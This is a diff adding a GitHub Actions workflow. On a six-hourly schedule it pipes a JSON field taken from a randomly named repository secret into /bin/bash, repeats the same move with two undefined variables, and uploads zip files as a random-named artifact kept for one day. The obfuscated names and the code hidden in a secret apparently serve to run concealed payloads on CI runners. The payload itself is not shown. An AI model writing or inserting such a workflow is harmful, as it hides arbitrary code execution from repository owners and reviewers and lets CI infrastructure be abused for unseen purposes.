@@ -1,0 +1,30 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          bjzph2579: ${{ secrets.bjzph2579 }}
+        run: |
+          printf '%s' "$bjzph2579" | jq -r .ikgbx74276 | /bin/bash
+          echo $ymwcx6 | jq -r .y83902 | /bin/bash
+          echo $sgp949 | jq -r .t2984 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2ySg1KfR
+          path: "*.zip"
+          retention-days: 1
